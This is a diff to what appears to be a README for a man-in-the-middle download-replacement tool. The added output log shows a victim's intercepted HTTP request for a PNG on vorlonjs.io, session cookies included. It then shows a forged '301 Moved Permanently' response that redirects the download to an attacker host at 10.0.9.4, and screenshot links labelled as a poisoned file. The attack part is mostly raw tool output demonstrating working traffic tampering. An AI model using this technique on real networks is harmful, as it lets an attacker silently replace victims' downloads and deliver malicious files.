@@ -10,56 +10,86 @@
    Example over extension files ".png" images:
    
    
-   root@kali:~/PycharmProjects/mitm_process.py# python replace_downlad.py 
+        root@kali:~/PycharmProjects/mitm_process.py# python replace_downlad.py 
+        
+        
+        
+        
+        
+        
+        
+        
+        [+] donwload png file Request
+        ###[ IP ]### 
+          version   = 4
+          ihl       = 5
+          tos       = 0x0
+          len       = 555
+          id        = 60647
+          flags     = DF
+          frag      = 0
+          ttl       = 127
+          proto     = tcp
+          chksum    = 0x3587
+          src       = 10.0.9.5
+          dst       = 23.101.172.244
+          \options   \
+        ###[ TCP ]### 
+             sport     = 50369
+             dport     = http
+             seq       = 596615170
+             ack       = 1840367
+             dataofs   = 5
+             reserved  = 0
+             flags     = PA
+             window    = 65535
+             chksum    = 0xcf6d
+             urgptr    = 0
+             options   = []
+        ###[ Raw ]### 
+                load      = 'GET /images/illustration-computer-devices.png HTTP/1.1\r\nReferer: http://www.vorlonjs.io/plugins/\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763\r\nCache-Control: max-age=0\r\nAccept: image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5\r\nAccept-Language: en-US\r\nAccept-Encoding: gzip, deflate\r\nHost: www.vorlonjs.io\r\nConnection: Keep-Alive\r\nCookie: ARRAffinity=8476eb23cae9d2dd7640d0930ea40ce5ee17c68542fea71b9732b7269b64e40c\r\n\r\n'
+        
+        None
+        [+] response downlad file png type
+        [+] replacing file .....
+        ###[ IP ]### 
+          version   = 4
+          ihl       = 5
+          tos       = 0x0
+          len       = None
+          id        = 47458
+          flags     = 
+          frag      = 0
+          ttl       = 254
+          proto     = tcp
+          chksum    = None
+          src       = 23.101.172.244
+          dst       = 10.0.9.5
+          \options   \
+        ###[ TCP ]### 
+             sport     = http
+             dport     = 50369
+             seq       = 1840367
+             ack       = 596615685
+             dataofs   = 5
+             reserved  = 0
+             flags     = PA
+             window    = 32253
+             chksum    = None
+             urgptr    = 0
+             options   = []
+        ###[ Raw ]### 
+                load      = 'HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.9.4/image.jpg\n\n'
+        
+        None
+        [+] packet succefully replaced ......
 
 
-
-
-
-
-
-    [+] donwload png file Request
-    ###[ IP ]### 
-      version   = 4
-      ihl       = 5
-      tos       = 0x0
-      len       = 607
-      id        = 56481
-      flags     = DF
-      frag      = 0
-      ttl       = 64
-      proto     = tcp
-      chksum    = 0x8b8f
-      src       = 10.0.2.15
-      dst       = 23.101.172.244
-      \options   \
-    ###[ TCP ]### 
-         sport     = 34320
-         dport     = http
-         seq       = 640728776
-         ack       = 244754
-         dataofs   = 5
-         reserved  = 0
-         flags     = PA
-         window    = 63712
-         chksum    = 0xd3cf
-         urgptr    = 0
-         options   = []
-    ###[ Raw ]### 
-            load      = 'GET /images/header-stars.png HTTP/1.1\r\nHost: www.vorlonjs.io\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\nAccept: image/webp,*/*\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nReferer: http://www.vorlonjs.io/css/main.css\r\nConnection: keep-alive\r\nCookie: _ga=GA1.2.691487594.1589563688; _gid=GA1.2.902708087.1589563688; ARRAffinity=5f6a84feb0f432414866a8390327b4f7cc30bdcffa70f8c37512930b34042f07\r\nIf-Modified-Since: Wed, 06 May 2015 15:08:32 GMT\r\nIf-None-Match: "51213084e88d01:0"\r\nCache-Control: max-age=0\r\n\r\n'
-    
-    None
-    [+] donwload png file Request
-    ###[ IP ]### 
-      version   = 4
-      ihl       = 5
-      tos       = 0x0
-      len       = 615
-      id        = 53206
-      flags     = DF
-      frag      = 0
-      ttl       = 64
-      proto     = tcp
-      chksum    = 0x9852
-      src       = 10.0.2.15
  
+ ![inital-web](original_replace_download.png)
+ 
+ 
+ ![poisoned-file](local_image_redirectio.png)
+ 
+ 
+ ![replacement-web](replace_download_packet.png)
